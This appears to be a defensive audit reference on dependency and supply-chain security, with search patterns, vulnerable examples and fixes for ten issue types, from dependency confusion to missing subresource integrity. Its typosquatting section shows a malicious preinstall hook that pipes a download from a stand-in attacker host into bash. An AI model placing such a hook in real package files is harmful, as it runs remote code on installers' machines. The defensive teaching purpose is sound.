# Dependencies & Supply Chain Security

## Scope

Vulnerable dependencies | Outdated packages | Dependency confusion | Supply chain attacks | Malicious packages | Typosquatting | License compliance | Package integrity | Transitive dependencies | Version pinning | Lock files

## Vulnerabilities

### 1. Known Vulnerable Dependencies

**Search**: `package\.json|requirements\.txt|Gemfile|go\.mod|Cargo\.toml|pom\.xml|composer\.json|package-lock\.json|yarn\.lock|poetry\.lock`

**Issue**: Dependencies with known CVEs | Outdated packages | Security advisories ignored | No vulnerability scanning

**Severity**: Critical to Low (depends on vulnerability)

**Fix**: Run npm audit / pip-audit / bundle audit | Update vulnerable packages | Set up automated scanning (Dependabot, Snyk)

**Evidence patterns**:
```
# Check for vulnerabilities
npm audit
npm audit --production  # Production deps only
pip-audit
bundle audit
cargo audit
go list -json -m all | docker run --rm -i sonatypecommunity/nancy:latest sleuth
```

**Secure patterns**:
```
# Fix vulnerabilities
npm audit fix
npm audit fix --force  # Breaking changes
pip install --upgrade package-name

# Automated scanning
# GitHub Dependabot (enable in repo settings)
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"

# CI/CD integration
# .github/workflows/security.yml
- name: Run npm audit
  run: npm audit --audit-level=high

# Snyk
snyk test
snyk monitor
```

**Ref**: CWE-1035, A06:2021

---

### 2. Outdated Dependencies

**Search**: `package\.json|requirements\.txt|dependencies|devDependencies`

**Issue**: Very old packages | Unmaintained dependencies | Missing security patches | No update strategy

**Severity**: Medium (increased attack surface)

**Fix**: Regular updates | Monitor for EOL packages | Replace unmaintained deps

**Evidence patterns**:
```
# Check outdated packages
npm outdated
pip list --outdated
bundle outdated
cargo outdated
composer outdated

# Check for deprecated packages
npm deprecate
npm ls deprecated
```

**Secure patterns**:
```
# Update to latest
npm update
npm update --save  # Update package.json
pip install --upgrade-strategy eager -r requirements.txt

# Interactive updates
npx npm-check-updates -i
pipx run pip-upgrader

# Check package health
npx npm-check
npm-check -u

# Replace unmaintained packages
# Find alternatives on npmjs.com, libraries.io
# Check GitHub: last commit, open issues, stars
```

**Ref**: CWE-1395, A06:2021

---

### 3. Dependency Confusion / Substitution

**Search**: `package\.json|\.npmrc|pip\.conf|requirements\.txt|registry|scope|@`

**Issue**: No scope for private packages | Public registry prioritized | No registry pinning | Attackers can publish malicious public package with same name

**Severity**: Critical (supply chain attack, code execution)

**Fix**: Use scoped packages (@company/package) | Pin private registry | Verify package source

**Evidence patterns**:
```
# Vulnerable - unscoped private package name
"dependencies": {
  "internal-utils": "^1.0.0"  // Can be confused with public package!
}

# No registry configuration
# Defaults to public npm registry
```

**Secure patterns**:
```
# Use scoped packages
"dependencies": {
  "@company/internal-utils": "^1.0.0"
}

# .npmrc - pin registry for scope
@company:registry=https://npm.pkg.github.com
//npm.pkg.github.com/:_authToken=${NPM_TOKEN}

# Python - use private index
# pip.conf or requirements.txt
--index-url https://pypi.company.com/simple
--extra-index-url https://pypi.org/simple  # Public as fallback

# Verify before installing
npm view package-name
pip show package-name
```

**Ref**: CWE-427, A08:2021

---

### 4. Missing Lock Files

**Search**: `package-lock\.json|yarn\.lock|Gemfile\.lock|poetry\.lock|composer\.lock|Cargo\.lock|go\.sum`

**Issue**: No lock file committed | Inconsistent versions across environments | Supply chain attack via version range

**Severity**: High (inconsistent builds, supply chain risk)

**Fix**: Commit lock files | Use exact versions | Verify integrity

**Evidence patterns**:
```
# Check if lock file exists
ls package-lock.json yarn.lock poetry.lock

# Check .gitignore
cat .gitignore | grep -E 'lock|Gemfile\.lock|yarn\.lock'

# Vulnerable - no lock, wide version ranges
"dependencies": {
  "express": "^4.0.0"  // Could install 4.99.99!
}
```

**Secure patterns**:
```
# Always commit lock files
git add package-lock.json yarn.lock poetry.lock
# Don't add to .gitignore!

# Generate lock files
npm install  # Creates package-lock.json
yarn install  # Creates yarn.lock
pip freeze > requirements.lock
poetry lock

# Verify integrity on CI
npm ci  # Uses lock file, fails if inconsistent
yarn install --frozen-lockfile
pip install -r requirements.lock

# Use exact versions for critical deps
"dependencies": {
  "express": "4.18.2"  // Exact version
}
```

**Ref**: CWE-494, A08:2021

---

### 5. Typosquatting / Malicious Packages

**Search**: `npm install|pip install|gem install|go get|package names`

**Issue**: Typos in package names | Malicious packages with similar names | No verification before install | Scripts run on install (preinstall, postinstall)

**Severity**: Critical (code execution, data theft)

**Fix**: Verify package names | Review install scripts | Use trusted registries | Monitor installs

**Evidence patterns**:
```
# Typosquatting examples
npm install expresss  # Not express!
pip install reqeusts  # Not requests!
npm install loadsh  # Not lodash!

# Malicious install scripts
"scripts": {
  "preinstall": "curl attacker.com | bash"  // Runs on install!
}
```

**Secure patterns**:
```
# Verify package before installing
npm view package-name
npm info package-name
pip show package-name

# Check package popularity/downloads
# npmjs.com - weekly downloads
# pypi.org - total downloads

# Review install scripts
npm show package-name scripts
cat node_modules/package-name/package.json

# Disable scripts (careful - breaks some packages)
npm install --ignore-scripts
npm config set ignore-scripts true

# Use package manager with verification
npx npm-install-check

# Monitor for unexpected installs
git diff package.json package-lock.json
```

**Ref**: CWE-506, A08:2021

---

### 6. Missing Subresource Integrity

**Search**: `<script.*src.*cdn|<link.*href.*cdn|integrity|crossorigin|unpkg|jsdelivr|cdnjs`

**Issue**: CDN scripts without integrity hash | CDN compromise possible | No verification of loaded code

**Severity**: High (supply chain attack, XSS)

**Fix**: Add integrity attribute | Use SRI for all CDN resources | Self-host critical dependencies

**Evidence patterns**:
```
# Vulnerable - no SRI
<script src="https://cdn.jsdelivr.net/npm/vue@3"></script>
<script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
```

**Secure patterns**:
```
# With SRI hash
<script
  src="https://cdn.jsdelivr.net/npm/vue@3.3.4/dist/vue.global.prod.js"
  integrity="sha384-abc123..."
  crossorigin="anonymous">
</script>

# Generate SRI hash
curl https://cdn.example.com/lib.js | openssl dgst -sha384 -binary | openssl base64 -A

# Or use SRI hash generator
https://www.srihash.org/

# Self-host critical deps (most secure)
npm install vue
<script src="/static/vue.js"></script>
```

**Ref**: CWE-353, A08:2021

---

### 7. Transitive Dependency Vulnerabilities

**Search**: `npm ls|pip show|bundle list|dependencies tree`

**Issue**: Vulnerable transitive (indirect) dependencies | Not directly specified | Hard to detect | No control over versions

**Severity**: Medium to High (depends on vulnerability)

**Fix**: Audit full dependency tree | Use dependency override/resolutions | Update parent packages

**Evidence patterns**:
```
# Check dependency tree
npm ls
npm ls --all
pip show package-name | grep Requires

# Find which package depends on vulnerable one
npm ls vulnerable-package
npm explain vulnerable-package
```

**Secure patterns**:
```
# Override transitive dependency version
# package.json (npm)
"overrides": {
  "axios": "1.6.0"  // Force all axios to 1.6.0
}

# yarn
"resolutions": {
  "axios": "1.6.0"
}

# Python
# requirements.txt
parent-package==1.2.3
vulnerable-dep>=2.0.0  # Override transitive version

# Update parent package (preferred)
npm update parent-package
```

**Ref**: CWE-1035, A06:2021

---

### 8. Insecure Package Sources

**Search**: `npm install.*http:|pip install.*http:|git\+http:|--index-url.*http:|registry.*http`

**Issue**: Installing from HTTP (not HTTPS) | Unverified sources | Git URLs without commit hash | Private registries over HTTP

**Severity**: High (MITM, package tampering)

**Fix**: HTTPS only | Verify package signatures | Pin git commits | Trusted registries

**Evidence patterns**:
```
# Vulnerable
npm install http://registry.example.com/package
pip install --index-url http://pypi.company.com/simple package
"dependencies": {
  "package": "git+http://github.com/user/repo"  // HTTP!
}
```

**Secure patterns**:
```
# HTTPS only
npm install https://registry.npmjs.org/package
pip install --index-url https://pypi.org/simple package

# Git dependencies with commit hash
"dependencies": {
  "package": "git+https://github.com/user/repo.git#abc123def"
}

# Verify package signatures
npm install --verify-signatures  # Future feature
# Python: use pip with --require-hashes

# Configure trusted registries
# .npmrc
registry=https://registry.npmjs.org/

# pip.conf
[global]
index-url = https://pypi.org/simple
trusted-host =  # Empty - require HTTPS
```

**Ref**: CWE-494, CWE-924, A08:2021

---

### 9. License Compliance Issues

**Search**: `license|LICENSE|package\.json|requirements\.txt|licenses`

**Issue**: GPL dependencies in proprietary software | Incompatible licenses | Unknown licenses | No license tracking

**Severity**: Low (legal risk, not security)

**Fix**: Audit licenses | Use license checker tools | Avoid incompatible licenses

**Evidence patterns**:
```
# Check licenses
npm ls --depth=0 | grep -i license
npx license-checker
pip-licenses
cargo license

# Look for copyleft licenses
grep -r "GPL" node_modules/*/package.json
```

**Secure patterns**:
```
# Automated license checking
npx license-checker --summary
npx license-checker --onlyAllow "MIT;Apache-2.0;BSD-3-Clause"

# CI/CD integration
npm install -g license-checker
license-checker --failOn "GPL"

# Python
pip install pip-licenses
pip-licenses --fail-on "GPLv3"

# FOSSA / WhiteSource (commercial tools)
```

**Ref**: Legal compliance

---

### 10. No Dependency Monitoring

**Search**: `.github/dependabot\.yml|renovate\.json|\.snyk|security scanning`

**Issue**: No automated dependency updates | No vulnerability alerts | Manual process | Delayed patches

**Severity**: Medium (delayed security patches)

**Fix**: Enable Dependabot | Use Snyk/WhiteSource | CI/CD scanning | Automated PRs

**Evidence patterns**:
```
# Check for automation
ls .github/dependabot.yml
ls renovate.json
ls .snyk

# No CI/CD security checks
cat .github/workflows/*.yml | grep -i audit
```

**Secure patterns**:
```
# GitHub Dependabot
# .github/dependabot.yml
version: 2
updates:
  - package-ecosystem: "npm"
    directory: "/"
    schedule:
      interval: "weekly"
    open-pull-requests-limit: 10

# Renovate
# renovate.json
{
  "extends": ["config:base"],
  "automerge": true,
  "major": { "automerge": false }
}

# Snyk
npm install -g snyk
snyk auth
snyk monitor  # Continuous monitoring
snyk test  # One-time check

# CI/CD
# .github/workflows/security.yml
- run: npm audit --audit-level=moderate
- run: snyk test
```

**Ref**: A06:2021

---

